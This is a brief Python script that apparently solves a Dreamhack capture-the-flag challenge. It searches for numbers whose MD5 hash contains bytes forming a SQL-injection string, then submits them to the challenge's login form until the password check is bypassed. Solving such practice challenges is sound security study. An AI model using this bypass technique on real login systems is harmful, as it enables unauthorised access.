from hashlib import md5
import requests

port = 23451
url_index = f"http://host3.dreamhack.games:{port}/"

cand = []
for i in range(1, 111112211):
    md = md5(str(i).encode()).hexdigest()
    if "273d27" in md:
        cand.append(i)

for c in cand:
    param = {"ps": c}
    r = requests.post(url_index, data=param)
    if "wrong" not in r.text:
        print(r.text)
        break
